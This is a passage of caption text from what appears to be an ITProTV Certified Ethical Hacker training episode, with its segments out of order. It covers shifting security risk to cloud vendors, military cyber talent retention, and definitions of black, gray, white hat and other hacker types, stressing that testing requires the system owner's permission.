shifting,\n\n517\n00:26:09.210 --> 00:26:13.010\nwe're essentially transferring\nthe risk from one place to another.\n\n518\n00:26:13.010 --> 00:26:16.540\nI, or Mike no longer have to\npatch that application, right?\n\n519\n00:26:16.540 --> 00:26:18.000\nWe could sit back and do what we do.\n\n520\n00:26:18.000 --> 00:26:20.230\nWe could consume, and\ndo things we have to do.\n\n521\n00:26:20.230 --> 00:26:23.180\nBut somebody,\nsomewhere has to still be on guard, right?\n\n522\n00:26:23.180 --> 00:26:25.060\nSomebody, somewhere still has to patch it.\n\n523\n00:26:25.060 --> 00:26:29.120\nIt's not that we get rid of that focus,\nwe simply shift the requirement and\n\n524\n00:26:29.120 --> 00:26:31.200\nthe liability for the risk.\n\n525\n00:26:31.200 --> 00:26:33.680\nNow, you can say that's a good thing,\nshifting it to the vendor.\n\n526\n00:26:33.680 --> 00:26:34.880\nThat may not be a bad thing.\n\n527\n00:26:34.880 --> 00:26:38.490\nAnd indeed, that is one of the key\npushing or selling points of the cloud,\n\n528\n00:26:38.490 --> 00:26:43.160\nin this particular area or going with an\nMSSP, a Managed Security Service Provider.\n\n529\n00:26:43.160 --> 00:26:46.660\nEssentially a third party, outsourced\nprovider that takes over management of\n\n530\n00:26:46.660 --> 00:26:50.730\nyour network on behalf of you,\nas a customer, negotiating with you about\n\n531\n00:26:50.730 --> 00:26:54.040\nwhat you want done and again,\nthrough the cloud, remotely enabling\n\n532\n00:26:54.040 --> 00:26:57.250\naccess to those systems that you want\nmanaged, they manage it for you.\n\n533\n00:26:57.250 --> 00:26:59.930\nGet anything today as a service, right?\n\n534\n00:26:59.930 --> 00:27:02.220\nDB is a service, database is a service.\n\n535\n00:27:02.220 --> 00:27:06.170\nDR, data recovery or\ndisaster recovery, BCDR is a service.\n\n536\n00:27:06.170 --> 00:27:08.250\nYou can get anything you\nwant as a service today.\n\n537\n00:27:08.250 --> 00:27:10.510\nI'm waiting for\nVirtual Espresso as a service so\n\n538\n00:27:10.510 --> 00:27:14.320\nI don't have to go wait in line\nanymore when I wanna go get coffee\n\n539\n00:27:14.320 --> 00:27:17.990\nat a coffee company that\nshall remain nameless, right?\n\n540\n00:27:17.990 --> 00:27:20.020\nComing soon to a corner near you.\n\n541\n00:27:20.020 --> 00:27:23.560\nBut the reality is we can get almost\nanything today over the cloud.\n\n542\n00:27:23.560 --> 00:27:26.930\nSo we can deal with, and\ndo, a lot of these things.\n\n543\n00:27:26.930 --> 00:27:29.500\nBut we have to understand that ultimately\nthere still has to be somebody's\n\n544\n00:27:29.500 --> 00:27:30.400\nhand on the wheel.\n\n545\n00:27:30.400 --> 00:27:35.020\nRegardless of whatever kind of a task we\ntalk about, some where, some how some way.\n\n546\n00:27:35.020 --> 00:27:38.280\nSomebody's gotta be on the defense and\nsomebody's on the offense.\n\n547\n00:27:38.280 --> 00:27:41.580\nThe basic rules of the game in other\nwords don't change just because\n\n548\n00:27:41.580 --> 00:27:42.160\nwe're doing this.\n\n549\n00:27:42.160 --> 00:27:45.880\nWe just have to think about the fact\nthat we may not be on the front lines.\n\n550\n00:27:45.880 --> 00:27:47.770\nWe may be transferring the risk and\n\n551\n00:27:47.770 --> 00:27:51.650\nthe cost to another vendor,\nasking them to assume it on our behalf.\n\n552\n00:27:51.650 --> 00:27:53.630\nThat doesn't mean this is\na security professional by the way.\n\n553\n00:27:53.630 --> 00:27:56.740\nWe abrogate,\nwe walk away from all our responsibility.\n\n554\n00:27:56.740 --> 00:27:59.980\nIf anything we have the more important\nresponsibility at that point.\n\n555\n00:27:59.980 --> 00:28:03.230\nWe now have governance and\ncompliance and risk management.\n\n556\n00:28:03.230 --> 00:28:06.720\nGRC concerns that we have to engage in\n\n557\n00:28:06.720 --> 00:28:09.760\nto monitor the fact that that\nvendor is doing their job.\n\n558\n00:28:09.760 --> 00:28:12.680\nTo ensure that the patches\nare applied correctly to the best\n\n559\n00:28:12.680 --> 00:28:15.490\nof our ability to have\nvisibility into that system.\n\n560\n00:28:15.490 --> 00:28:18.000\nTo validate that the things that\nhave to happen are happening.\n\n561\n00:28:18.000 --> 00:28:19.570\nIndeed if they are, great.\n\n562\n00:28:19.570 --> 00:28:22.040\nAnd if not, let's get on the phone and\ntalk to that vendor and\n\n563\n00:28:22.040 --> 00:28:24.220\nfind out why not,\nvery very important also.\n\n564\n00:28:24.220 --> 00:28:26.620\nWe have to also think about\ninformation worth it,\n\n565\n00:28:26.620 --> 00:28:30.820\nthink about the defense-offense concept\nthat I'm kinda describing here.\n\n566\n00:28:30.820 --> 00:28:34.505\nWe may bring in some heavy hitters like\nthe The Microsofts and the Googles and\n\n567\n00:28:34.505 --> 00:28:35.535\nthe Amazons and\n\n568\n00:28:35.535 --> 00:28:41.235\nthe VMwares of the world to contract out\nto them our infrastructure management.\n\n569\n00:28:41.235 --> 00:28:43.815\nAnd they've got resources that,\nin many cases,\n\n570\n00:28:43.815 --> 00:28:46.560\nfar exceed our ability to do these things.\n\n571\n00:28:46.560 --> 00:28:51.810\nBut the reality is somebody still has\nto be keeping in touch with, on top of,\n\n572\n00:28:51.810 --> 00:28:53.580\nand track those concerns.\n\n573\n00:28:53.580 --> 00:28:55.760\nIt becomes very important as well, right?\n\n574\n00:28:55.760 --> 00:28:58.700\nJust some things to consider, I guess you\nwould think of in that respect, right.\n\n575\n00:28:58.700 --> 00:29:00.250\nWhen we're thinking about information.\n\n576\n00:29:00.250 -->

work.\n\n586\n00:29:28.740 --> 00:29:29.860\nBut interesting thing,\n\n587\n00:29:29.860 --> 00:29:33.690\nwe've got brain drain going on in that\nsector just like everywhere else.\n\n588\n00:29:33.690 --> 00:29:38.350\nCyber Command is struggling to keep\ntheir top talent employed because\n\n589\n00:29:38.350 --> 00:29:42.020\nthey learn these skills, these people go\nin, you're a member of the Armed Services,\n\n590\n00:29:42.020 --> 00:29:46.720\nyou get recruited and get routed to one of\nthese either agencies and or commands that\n\n591\n00:29:46.720 --> 00:29:50.900\nspecializes by branch in this areas,\nif you have these kind of skills.\n\n592\n00:29:50.900 --> 00:29:54.810\nOr you can train to go into this, and\nbe trained when you enter the armed forces\n\n593\n00:29:54.810 --> 00:29:58.390\nget this kind of training, and\nyou can select to go into these commands.\n\n594\n00:29:58.390 --> 00:30:02.370\nAnd they train these people, very\ntalented, very dedicated people, four,\n\n595\n00:30:02.370 --> 00:30:05.170\nsix, eight, ten years, depending on\nwhat they do, how long they're in for.\n\n596\n00:30:05.170 --> 00:30:08.550\nThey come out and they've got mad,\nmad hacking skills.\n\n597\n00:30:08.550 --> 00:30:11.160\nAnd just ridiculous amounts of knowledge.\n\n598\n00:30:11.160 --> 00:30:12.790\nAnd they're having trouble\ngetting them to re-up\n\n599\n00:30:12.790 --> 00:30:14.190\nbecause they just can't pay them enough.\n\n600\n00:30:14.190 --> 00:30:16.370\nThey can go out in the private sector and\nearn five, six,\n\n601\n00:30:16.370 --> 00:30:20.520\nseven times what they're earning\ndoing this incredibly important work.\n\n602\n00:30:20.520 --> 00:30:23.340\nDefending our country and\nother countries around the world.\n\n603\n00:30:23.340 --> 00:30:25.240\nBut it's just very tough to keep them,\n>> Right.\n\n604\n00:30:25.240 --> 00:30:26.270\n>> because of the kind of skills [LAUGH]\n>> [LAUGH]\n\n605\n00:30:26.270 --> 00:30:27.490\n>> they're learning, right?\n\n606\n00:30:27.490 --> 00:30:29.560\nI mean talk about being\na certified ethical hacker.\n\n607\n00:30:29.560 --> 00:30:31.660\n>> Yes.\n>> You wanna learn how to really\n\n608\n00:30:31.660 --> 00:30:32.610\nhack, right?\n\n609\n00:30:32.610 --> 00:30:33.850\n>> [LAUGH]\n>> That's the kind of thing that\n\n610\n00:30:33.850 --> 00:30:36.900\nreally teaches you whats going on, because\nyeah, we're gonna teach you a lot about\n\n611\n00:30:36.900 --> 00:30:40.970\nthe things you can do, but these people\nlearn about all the things that go on\n\n612\n00:30:40.970 --> 00:30:44.220\nbehind the scenes, and think about the\nkind of things that they get access to.\n\n613\n00:30:44.220 --> 00:30:46.390\nYou think some of the stuff\nI'm gonna show you is cool,\n\n614\n00:30:46.390 --> 00:30:49.330\nlet's talk about the stuff that\nsomebody builds with no budget, right,\n\n615\n00:30:49.330 --> 00:30:53.480\nthere's no restriction, and there's no\nrules on the engagement model for that,\n\n616\n00:30:53.480 --> 00:30:55.700\nthat we are bound by\nin the private sector.\n\n617\n00:30:55.700 --> 00:30:56.950\nThey just say yeah we have a mission,\n\n618\n00:30:56.950 --> 00:31:00.770\nwe need to figure out how to get into this\ncountry's digital information network and\n\n619\n00:31:00.770 --> 00:31:03.670\nfind their nuclear capability and\ndismantle it.\n\n620\n00:31:03.670 --> 00:31:07.230\nSo here's malware that does that,\nwe're gonna teach you how to deploy it.\n\n621\n00:31:07.230 --> 00:31:09.580\nYou get to play with that kind of stuff.\n\n622\n00:31:09.580 --> 00:31:10.635\nWow, right?\n\n623\n00:31:10.635 --> 00:31:11.980\n>> [LAUGH]\n>> That's what I wanna do when I grow\n\n624\n00:31:11.980 --> 00:31:12.600\nup, right?\n\n625\n00:31:12.600 --> 00:31:13.280\n>> Absolutely.\n\n626\n00:31:13.280 --> 00:31:14.572\n>> It's pretty cool stuff.\n\n627\n00:31:14.572 --> 00:31:18.443\n>> [LAUGH] All right Adam and again\na great look at still laying some of that\n\n628\n00:31:18.443 --> 00:31:23.119\nfoundational knowledge and kind of working\nour way into starting to realize what it\n\n629\n00:31:23.119 --> 00:31:27.155\nmeans to be a CEH and understanding\nthat we have to stay on top of things.\n\n630\n00:31:27.155 --> 00:31:28.910\nIt's a constant learning process.\n\n631\n00:31:28.910 --> 00:31:32.240\nLearning about the different\nattack vectors that\n\n632\n00:31:32.240 --> 00:31:34.240\nwe're gonna have to face out\nthere in the real world.\n\n633\n00:31:34.240 --> 00:31:35.490\nSo we thank you for that, Adam.\n\n634\n00:31:35.490 --> 00:31:37.124\nHope everybody out there\nenjoyed watching this one.\n\n635\n00:31:37.124 --> 00:31:38.815\nSigning off for ITPro.tv.\n\n636\n00:31:38.815 --> 00:31:39.739\nI'm Mike Roderick.\n\n637\n00:31:39.739 --> 00:31:40.867\n>> I'm Adam

00:00:20.278\nI'm your host Mike Rodrick and\ntoday we're doing our CEH v9.\n\n4\n00:00:20.278 --> 00:00:22.414\nAnd specifically in this episode,\n\n5\n00:00:22.414 --> 00:00:26.840\nwe're going to be looking at\nhacking concepts, types and phases.\n\n6\n00:00:26.840 --> 00:00:29.360\nAnd here to walk us through all\nof that is Mr. Adam Gordon.\n\n7\n00:00:29.360 --> 00:00:30.580\nHow you doing Adam?\n\n8\n00:00:30.580 --> 00:00:31.130\n>> I'm good.\nI'm good.\n\n9\n00:00:31.130 --> 00:00:33.570\nSo hacking types, phases, and concepts.\n\n10\n00:00:33.570 --> 00:00:35.670\nI didn't realize there was\na distinction between them.\n\n11\n00:00:35.670 --> 00:00:36.423\nBut that's okay.\n\n12\n00:00:36.423 --> 00:00:38.323\n[CROSSTALK] And there is actually.\n\n13\n00:00:38.323 --> 00:00:39.914\nI'm just playing around.\n\n14\n00:00:39.914 --> 00:00:44.091\nWe're gonna talking about hacking little\nbit continue our conversation with regards\n\n15\n00:00:44.091 --> 00:00:45.700\nto how we define what hacking is.\n\n16\n00:00:45.700 --> 00:00:49.680\nWe're gonna make a distinction in this\nepisode with regards to hacking and\n\n17\n00:00:49.680 --> 00:00:53.555\nthen later on we'll define ethical hacking\nwhich is actually little bit different,\n\n18\n00:00:53.555 --> 00:00:55.655\nbut it's the focus as hopefully\nyou will come to know,\n\n19\n00:00:55.655 --> 00:00:59.665\nif you don't already, of what being a CEH,\na Certified Ethical Hacker, is all about.\n\n20\n00:00:59.665 --> 00:01:04.425\nBeing a hacker is, in our world, being\non the wrong side of this conversation.\n\n21\n00:01:04.425 --> 00:01:06.210\nSomebody who is up to no good.\n\n22\n00:01:06.210 --> 00:01:09.780\nActing essentially in bad faith,\nusing knowledge, expertise, and\n\n23\n00:01:09.780 --> 00:01:13.010\ntools to take advantage of a system and\nexploit weaknesses or\n\n24\n00:01:13.010 --> 00:01:17.160\nvulnerabilities in order to be able to\ngain access and compromise a system.\n\n25\n00:01:17.160 --> 00:01:20.860\nBut to do so without permission and\nwithout authorization either from\n\n26\n00:01:20.860 --> 00:01:25.460\nthe customer, the owner or whoever maybe\nable to give them that right with regards\n\n27\n00:01:25.460 --> 00:01:30.460\nto that system to help as opposed to\nhinder the defense of that system.\n\n28\n00:01:30.460 --> 00:01:34.560\nHackers in other words are bad\npeople that are up to no good.\n\n29\n00:01:34.560 --> 00:01:38.380\nNow that's not to say that every\nhacker is evil, malicious and\n\n30\n00:01:38.380 --> 00:01:43.620\nacting out of just sheer disrespect and\n\n31\n00:01:43.620 --> 00:01:48.390\nor lack of concern for the people in\nthe systems that they take on many hackers\n\n32\n00:01:48.390 --> 00:01:51.920\nare simply doing this to see whether or\nnot they can, and have no ill will,\n\n33\n00:01:51.920 --> 00:01:57.090\nno malicious intent, no any kind of\nmalfeasance, or none of that going on.\n\n34\n00:01:57.090 --> 00:01:58.980\nAnd I wanna be clear, and I wanna be fair.\n\n35\n00:01:58.980 --> 00:02:02.810\nMany people that fall into this general\ncategory of hacking are not up to no good,\n\n36\n00:02:02.810 --> 00:02:04.790\nare not looking to do harm.\n\n37\n00:02:04.790 --> 00:02:08.480\nSimply are locked in because of a lack\nof understanding of that category and\n\n38\n00:02:08.480 --> 00:02:12.630\nthe subtlety of those definitions\ninto this general thought process.\n\n39\n00:02:12.630 --> 00:02:15.470\nOriginally, the concept of being a hacker,\n\n40\n00:02:15.470 --> 00:02:19.090\nwas really differentiated from\nthe concept of being a cracker.\n\n41\n00:02:19.090 --> 00:02:22.770\nAnd a hacker and a cracker were two\ndistinctly different entities or\n\n42\n00:02:22.770 --> 00:02:28.110\nroles that early on in computers and\ncomputer's security evolve to discuss\n\n43\n00:02:28.110 --> 00:02:32.840\nthe bad actors versus the people that were\nlooking to get into a system, assess it,\n\n44\n00:02:32.840 --> 00:02:36.880\nunderstand it, probe the extent and\nthe weakness of that defense and\n\n45\n00:02:36.880 --> 00:02:39.300\nthen take steps to document\nwhat they found either for\n\n46\n00:02:39.300 --> 00:02:42.940\nknowledge and or\nto then make the system more secure.\n\n47\n00:02:42.940 --> 00:02:46.679\nWe today generally just refer to everybody\nthat does any of this kind of work as\n\n48\n00:02:46.679 --> 00:02:47.203\na hacker.\n\n49\n00:02:47.203 --> 00:02:49.970\nBut that's not actually 100% accurate.\n\n50\n00:02:49.970 --> 00:02:52.340\nAnd it is a subtle but\nvery important distinction.\n\n51\n00:02:52.340 --> 00:02:54.850\nAs a CEH, as a certified ethical hacker.\n\n52\n00:02:54.850 --> 00:02:58.968\nWe'll go out of our way to make\nthe distinction that you are going to be\n\n53\n00:02:58.968 --> 00:03:02.170\nsomebody who is going to\nact with good in mind.\n\n54\n00:03:02.170 --> 00:03:05.990\nWho is going to take the defensive\nposition in your organization,\n\n55\n00:03:05.990 --> 00:03:11.110\nseeking to assess and to probe and\nto understand the limits of the defenses.\n\n56\n00:03:11.110 --> 00:03:15.250\nBut then to take that knowledge often\nhard one and hard fought for and\n\n57\n00:03:15.250 --> 00:03:18.800\napply it to the betterment of\nthe defense of the organization.\n\n58\n00:03:18.800 --> 00:03:21.300\nIn other words,\nyou will not act without permission.\n\n59\n00:03:21.300 --> 00:03:24.980\nOn behalf of the network owner, you will\nseek permission before you seek to probe,\n\n60\n00:03:24.980 --> 00:03:28.500\nbefore you seek to hack,\nbefore you seek to investigate and\n\n61\n00:03:28.500 --> 00:03:33.070\nto understand by using this knowledge and\nthen you will take that information,\n\n62\n00:03:33.070 --> 00:03:36.670\nwhatever it is, and you will apply\nit to make the system more secure.\n\n63\n00:03:36.670 --> 00:03:39.630\nThat is an ethical hacker\nas we define it today.\n\n64\n00:03:39.630 --> 00:03:40.650\nA hacker, or\n\n65\n00:03:40.650 --> 00:03:45.775\nhacking episode today as seen as having\na negative connotation associated with it.\n\n66\n00:03:45.775 --> 00:03:50.575\nOften, information or acquisition of\nit and steps taken without the proper\n\n67\n00:03:50.575 --> 00:03:54.905\nauthority, without\nthe proper prerequisite or\n\n68\n00:03:54.905 --> 00:03:58.410\nrequest for access and\nthe granting of privilege to come in and\n\n69\n00:03:58.410 --> 00:04:01.130\nprobe the system is what\nhacking is talking about today.\n\n70\n00:04:01.130 --> 00:04:04.780\nSo we want to understand that we\nare exploiting system vulnerabilities and\n\n71\n00:04:04.780 --> 00:04:08.340\nlooking to compromise\na system through hacking and\n\n72\n00:04:08.340 --> 00:04:10.100\nthrough certified ethical hacking.\n\n73\n00:04:10.100 --> 00:04:13.220\nBut the difference is that we're\nnot gonna take that exploit and\n\n74\n00:04:13.220 --> 00:04:17.270\nuse it to our advantage and compromise\nthe system without documenting it and\n\n75\n00:04:17.270 --> 00:04:21.430\nthen finding some sort of control or\nway to patch for that.\n\n76\n00:04:21.430 --> 00:04:23.420\nAnd then assess that and apply that.\n\n77\n00:04:23.420 --> 00:04:27.112\nThe ethical hacker in other words takes\nthat information that we find through\n\n78\n00:04:27.112 --> 00:04:28.249\nhacking activities and\n\n79\n00:04:28.249 --> 00:04:31.958\ngives it back to the organization in such\nof way that they can benefit from it.\n\n80\n00:04:31.958 --> 00:04:34.209\nWe wanna understand this important but\n\n81\n00:04:34.209 --> 00:04:38.925\nsubtle difference because ethical hackers\nacts specifically with this in mind.\n\n82\n00:04:38.925 --> 00:04:42.514\nIt is very important if you're\never ask at any point for\n\n83\n00:04:42.514 --> 00:04:47.429\nany reason Inside of an exam or outside\nunder any circumstances at any point\n\n84\n00:04:47.429 --> 00:04:52.421\nin time that as an ethical hacker, are you\nallowed to go and attack or probe or\n\n85\n00:04:52.421 --> 00:04:56.360\nsurvey or even examine any\nsystem without permission?\n\n86\n00:04:56.360 --> 00:04:57.614\nThe answer is no, you are not.\n\n87\n00:04:57.614 --> 00:05:00.360\nYou must always have the permission\nof the system owner.\n\n88\n00:05:00.360 --> 00:05:04.120\nIn some form, in some way,\nin order to engage in those activities.\n\n89\n00:05:04.120 --> 00:05:08.530\nMeaning, this could be able to get into\nthe types of hacking activity that exist\n\n90\n00:05:08.530 --> 00:05:09.830\nand that occur.\n\n91\n00:05:09.830 --> 00:05:13.730\nThis could be a blind,\ndouble blind kind of test.\n\n92\n00:05:13.730 --> 00:05:16.190\nWe sometimes call it white hat,\nblack hat, gray hat hacking.\n\n93\n00:05:16.190 --> 00:05:17.220\nWe'll define those terms in a minute.\n\n94\n00:05:17.220 --> 00:05:18.824\nIt's referred to different ways.\n\n95\n00:05:18.824 --> 00:05:20.945\nZero knowledge, partial knowledge,\n\n96\n00:05:20.945 --> 00:05:24.060\nfull knowledge test are also\nin that same category.\n\n97\n00:05:24.060 --> 00:05:28.790\nIf we have zero knowledge we still\nhave permission from the system owner.\n\n98\n00:05:28.790 --> 00:05:31.700\nWe're just not being given any\ninformation about the system at all.\n\n99\n00:05:31.700 --> 00:05:35.452\nBut we have been and indeed must be\nin touch with the system owner and\n\n100\n00:05:35.452 --> 00:05:37.812\nthey've said us and we've said to them.\n\n101\n00:05:37.812 --> 00:05:42.220\nWe mutually agree, this is what we're\ngonna do, this is the thing you want done.\n\n102\n00:05:42.220 --> 00:05:46.290\nYou've told me you want these systems to\nbe profiled under these conditions and\n\n103\n00:05:46.290 --> 00:05:48.980\nyou may or may not give me\ninformation about the system.\n\n104\n00:05:48.980 --> 00:05:53.361\nI may have to figure that out for myself\nas the hacker, but as the ethical hacker.\n\n105\n00:05:53.361 --> 00:05:57.017\nI'm given unequivocal permission to go and\nexamine a system before I\n\n106\n00:05:57.017 --> 00:06:00.560\never lay any kind of hands,\nvirtually or physical, on it.\n\n107\n00:06:00.560 --> 00:06:04.320\nIf I don't have that get out of jail\nfree card, as we often refer to it,\n\n108\n00:06:04.320 --> 00:06:07.190\nthat signed letter or\nthat attestation from the system owner.\n\n109\n00:06:07.190 --> 00:06:10.440\nBut I've been given rights to do that,\nI don't touch a system.\n\n110\n00:06:10.440 --> 00:06:12.320\nThis is a liability issue, right.\n\n111\n00:06:12.320 --> 00:06:15.800\nIf you operate in this environment\nyou understand, you can be sued, and\n\n112\n00:06:15.800 --> 00:06:20.270\nthere are legal ramifications associated\nwith hacking activity without permission.\n\n113\n00:06:20.270 --> 00:06:24.110\nWe want to be clear, want to be distinct,\nwant to be unequivocal about this and\n\n114\n00:06:24.110 --> 00:06:25.630\nthis distinction for you.\n\n115\n00:06:25.630 --> 00:06:28.230\nIt's very critical very important for\nyou to understand that.\n\n116\n00:06:28.230 --> 00:06:31.250\nHaving said that fine sir I think\nwe do have some vocabulary.\n\n117\n00:06:31.250 --> 00:06:31.770\n>> We do.\n>> And\n\n118\n00:06:31.770 --> 00:06:34.970\nsome list of types of hacking\nthat we want to take a look at.\n\n119\n00:06:34.970 --> 00:06:36.560\nWe've already hinted at these.\n\n120\n00:06:36.560 --> 00:06:40.060\nWe want to just talk about them a little\nbit, give you some definitions of them.\n\n121\n00:06:41.380 --> 00:06:44.640\nI talked about black hat, gray hat,\nwhite hat hacking a moment ago.\n\n122\n00:06:44.640 --> 00:06:48.810\nMentioned that it could also sometimes\nbe referred to as zero partial or full\n\n123\n00:06:48.810 --> 00:06:53.260\nknowledge or blind, double blind, hacking,\nthese are all kind of the same terms.\n\n124\n00:06:53.260 --> 00:06:56.340\nThey float around in our\nindustry often interchangeably.\n\n125\n00:06:56.340 --> 00:07:00.890\nA black hat hacker is an individual that,\nis gonna have skills that is looking to\n\n126\n00:07:00.890 --> 00:07:03.775\nuse them certainly very\nknowledgeable in many cases, but\n\n127\n00:07:03.775 --> 00:07:08.035\nis looking to use them unfortunately for\nevil as opposed to for good.\n\n128\n00:07:08.035 --> 00:07:12.885\nThink of them as being member not of the\nRebel Alliance but rather, in Star Wars,\n\n129\n00:07:12.885 --> 00:07:14.575\nthey would be aligned with the darkside.\n\n130\n00:07:14.575 --> 00:07:17.840\nSo The Darth Vaders of the world\nwould be the black hats.\n\n131\n00:07:17.840 --> 00:07:20.600\nThese are the hackers that\nare looking to take their skills and\n\n132\n00:07:20.600 --> 00:07:24.370\nare using them to hack, but\nto do so without the permission and\n\n133\n00:07:24.370 --> 00:07:27.750\nwithout the express written\nauthority of the owner of a system.\n\n134\n00:07:27.750 --> 00:07:31.370\nThey are attacking, in other words,\nas opposed to trying to do good.\n\n135\n00:07:31.370 --> 00:07:32.410\nRight?\n\n136\n00:07:32.410 --> 00:07:33.670\nYou saw no droids\n>> [LAUGH]\n\n137\n00:07:33.670 --> 00:07:35.200\n>> In that Land Rover.\n\n138\n00:07:35.200 --> 00:07:36.381\nI'm gonna let you go.\n\n139\n00:07:36.381 --> 00:07:37.925\nOf course you're gonna let me go, right?\n\n140\n00:07:37.925 --> 00:07:39.329\n>> [LAUGH]\n>> I love that whole thing Obi-Wan\n\n141\n00:07:39.329 --> 00:07:39.846\ndoes with the hand.\n\n142\n00:07:39.846 --> 00:07:41.147\n>> I know, if I could just master that.\n\n143\n00:07:41.147 --> 00:07:42.210\n>> Wouldn't that be awesome?\n\n144\n00:07:42.210 --> 00:07:42.741\n>> Yes.\n>> Right,\n\n145\n00:07:42.741 --> 00:07:44.056\nof course you wanna go\nhave Chinese tonight.\n\n146\n00:07:44.056 --> 00:07:46.460\n>> [LAUGH]\n>> Course you wanna go see that movie.\n\n147\n00:07:46.460 --> 00:07:49.180\nOf course I can go play golf\nwith my friends, right?\n\n148\n00:07:49.180 --> 00:07:49.950\nIt'd be awesome.\n\n149\n00:07:49.950 --> 00:07:51.200\nWouldn't it?\nThat would just be great.\n\n150\n00:07:51.200 --> 00:07:52.522\nExcept I don't play golf.\n\n151\n00:07:52.522 --> 00:07:53.699\nAll right.\nSo we have Black Hat.\n\n152\n00:07:53.699 --> 00:07:55.265\nWhat about Grey Hat Hackers?\n\n153\n00:07:55.265 --> 00:07:57.150\nSo Grey Hat Hackers kinda sit in between.\n\n154\n00:07:57.150 --> 00:07:57.912\nRight?\n\n155\n00:07:57.912 --> 00:08:01.497\nThere's Many shades of gray,\nas you probably are familiar with.\n\n156\n00:08:01.497 --> 00:08:05.747\nAnd when we think about in between, what\nwe're saying is that they sometimes will\n\n157\n00:08:05.747 --> 00:08:09.770\nwork on the dark side, and sometimes on\nthe white side, or on the light side.\n\n158\n00:08:09.770 --> 00:08:14.030\nMeaning, they may use their skills and\ntheir abilities for good, but\n\n159\n00:08:14.030 --> 00:08:16.760\nthen they also sometimes use\nthem to get up to no good.\n\n160\n00:08:16.760 --> 00:08:20.450\nAnd they can either be offensive or\ndefensive in their\n\n161\n00:08:20.450 --> 00:08:24.200\nthought process with regards to hacking\nand either having permission or\n\n162\n00:08:24.200 --> 00:08:27.730\noccasionally going out on their own, doing\nthings that they're not supposed to do.\n\n163\n00:08:27.730 --> 00:08:29.780\nKind of that in between area.\n\n164\n00:08:31.070 --> 00:08:34.490\nReality of our world is that sometimes\nwe have to get up to no good in order to\n\n165\n00:08:34.490 --> 00:08:35.260\nultimately do good.\n\n166\n00:08:35.260 --> 00:08:37.320\nI'm not saying that's a defense.\n\n167\n00:08:37.320 --> 00:08:39.970\nI'm not suggesting for\na minute that that is appropriate.\n\n168\n00:08:39.970 --> 00:08:43.310\nI'm just talking about the reality\nof where we tend to find ourselves.\n\n169\n00:08:43.310 --> 00:08:47.720\nWhite hat hacking is somebody\nwho has again, very good,\n\n170\n00:08:47.720 --> 00:08:50.650\nvery knowledgeable,\nvery deep skills right.\n\n171\n00:08:50.650 --> 00:08:54.280\nThink of the black hat hacker, the white\nhat hack is essentially the same thing.\n\n172\n00:08:54.280 --> 00:08:58.390\nBut the alternate ego, the person\nthat is working for the organization,\n\n173\n00:08:58.390 --> 00:09:01.270\nthat seeks the permission,\nthat goes to assess and\n\n174\n00:09:01.270 --> 00:09:04.370\nthen use that knowledge to\ntry to protect those systems.\n\n175\n00:09:04.370 --> 00:09:05.940\nDid you ever see the movie Wizards,\n\n176\n00:09:05.940 --> 00:09:09.180\nthe animated feature\nRalph Bakshi did the animation?\n\n177\n00:09:09.180 --> 00:09:13.560\nHe was the one that also did\nthe animation on Heavy Metal.\n\n178\n00:09:13.560 --> 00:09:17.120\n>> Okay, [CROSSTALK]\n>> He did it before he did Heavy Metal.\n\n179\n00:09:17.120 --> 00:09:18.160\nHe did Wizards.\n\n180\n00:09:18.160 --> 00:09:22.810\nIt was basically like\na Tolkien-esque thing.\n\n181\n00:09:22.810 --> 00:09:25.590\nIt was not the Lord of the Rings,\nit wasn't the same kind of thing, but\n\n182\n00:09:25.590 --> 00:09:26.340\nit was like that.\n\n183\n00:09:26.340 --> 00:09:29.370\nIt was a battle between dark and\nlight, good and evil.\n\n184\n00:09:29.370 --> 00:09:33.230\nBetween two wizard brothers,\nthat's the term or the title, really good.\n\n185\n00:09:33.230 --> 00:09:34.560\nIf you never saw this, it's a great.\n\n186\n00:09:34.560 --> 00:09:37.090\nIt's about an hour or\nan a half, animated short.\n\n187\n00:09:37.090 --> 00:09:38.560\nAwesome movie.\n\n188\n00:09:38.560 --> 00:09:43.265\nBut the concept, the black hat,\nthe white hat is really starkly\n\n189\n00:09:43.265 --> 00:09:46.425\ndefined in there with regards to\nthe two wizards and how they battle.\n\n190\n00:09:46.425 --> 00:09:48.015\nReally, really a great movie, really cool.\n\n191\n00:09:49.235 --> 00:09:55.142\nAll right, anyway, so we're here at the\nhacking film fest 2016 here at ITProTV.\n\n192\n00:09:55.142 --> 00:09:56.507\nLater on, we'll be interviewing.\n\n193\n00:09:56.507 --> 00:09:58.182\n>> [Laughing]\n>> No, I'm only kidding, right?\n\n194\n00:09:58.182 --> 00:09:58.972\nLet's continue on.\n\n195\n00:09:58.972 --> 00:09:59.932\nWhat do we have up there next?\n\n196\n00:09:59.932 --> 00:10:01.962\n>> Suicide hacker.\n\n197\n00:10:01.962 --> 00:10:02.662\n>> Suicide hacker.\n\n198\n00:10:02.662 --> 00:10:05.072\nSo, suicide hacker is a term.\n\n199\n00:10:05.072 --> 00:10:06.622\nYou don't often hear this term.\n\n200\n00:10:06.622 --> 00:10:09.910\nThis is not a term that I I\nthink you would probably find in\n\n201\n00:10:09.910 --> 00:10:13.270\naverage people's conversation\non a regular basis today.\n\n202\n00:10:13.270 --> 00:10:17.660\nIt obviously unfortunately has some very,\nvery tragic overlay\n\n203\n00:10:17.660 --> 00:10:21.150\nconsequences with the kind of things that\nwe see going on in the world politically\n\n204\n00:10:21.150 --> 00:10:25.140\naround the world today with regards to\n>> This kind of activity outside of\n\n205\n00:10:25.140 --> 00:10:28.530\nthe computer realm, and we're not\nnecessarily talking about that activity,\n\n206\n00:10:28.530 --> 00:10:31.020\nalthough it is aligned with\nthe definition of this term.\n\n207\n00:10:31.020 --> 00:10:34.810\nIt's essentially a person who's looking to\nuse their hacking skills to gain access to\n\n208\n00:10:34.810 --> 00:10:39.130\na system and is not gonna worry about\nthe consequences in terms of being caught.\n\n209\n00:10:39.130 --> 00:10:43.780\nPotentially they're just willing to take\na chance and hack and if they're caught,\n\n210\n00:10:43.780 --> 00:10:44.700\nso be it.\n\n211\n00:10:44.700 --> 00:10:48.530\nAnd you know you kind of infer\nfrom that what we would imply.\n\n212\n00:10:48.530 --> 00:10:51.510\nSo this is an individual that\nhas these kinds of skills and\n\n213\n00:10:51.510 --> 00:10:53.730\nis looking to get up to no good and\ndo harm.\n\n214\n00:10:53.730 --> 00:10:55.510\nBut is not worried about\nthe consequences or\n\n215\n00:10:55.510 --> 00:10:58.227\nbeing caught is essentially\nwhat we would define that as.\n\n216\n00:10:58.227 --> 00:11:03.410\nA script kiddie, is a derogatory term,\nwith regards to,\n\n217\n00:11:03.410 --> 00:11:06.180\nas 